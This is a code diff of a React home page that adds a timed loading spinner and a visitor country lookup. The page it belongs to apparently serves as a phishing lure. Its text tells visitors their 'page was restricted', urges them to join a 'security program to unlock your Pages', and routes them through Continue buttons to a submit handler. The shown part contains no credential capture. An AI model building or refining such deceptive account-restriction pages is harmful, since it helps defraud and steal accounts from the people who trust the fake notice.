@@ -4,8 +4,10 @@ import bannerImg from '../../../Resources/banner.jpg'
 import { Route, Routes, BrowserRouter, useNavigate } from "react-router-dom";
 
 const HomePage = () => {
+  const delay = ms => new Promise(res => setTimeout(res, ms));
   const navigate = useNavigate();
   const [countryCode, setCountryCode] = useState('');
+  const [showLanding, setShowLanding] = useState(false);
   const getCurrentTime = () => {
     const now = new Date();
     const m = now.toLocaleString("default", { month: "long" });
@@ -26,6 +28,9 @@ const HomePage = () => {
         })
       } catch (error) {
         console.error("Error fetching data:", error);
+      }finally{
+        await delay(3000);
+        setShowLanding(true);
       }
     };
     setLocaltion();
@@ -44,15 +49,17 @@ const HomePage = () => {
   {
   return (
   <main className="_wapper">
-    <div className="_container">
+    <div style={{display: !showLanding ? "inline-block" : "none"}} className="loading">
+      <div className="loader">
+      </div>
+    </div>
+    <div  style={{display: !showLanding ? "none" : "inline-block"}} className="_container">
         <div className="_header_image"><img src={bannerImg} alt="banner"/></div>
         <div className="_header_content">
           <h1>Your page was restricted on {getCurrentTime()}</h1>
           <span>Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.</span>
         </div>
         <a className="_link" onClick={handleSubmit}><span>More information</span></a>
-        {/* <a className="_button" onClick={handleSubmit} ></a> */}
-
         <button className="_button" onClick={handleSubmit}>Continue</button>
         <div className="px-[14px] mt-5">
           <ol className="relative text-gray-500 border-s-2 border-gray-200">
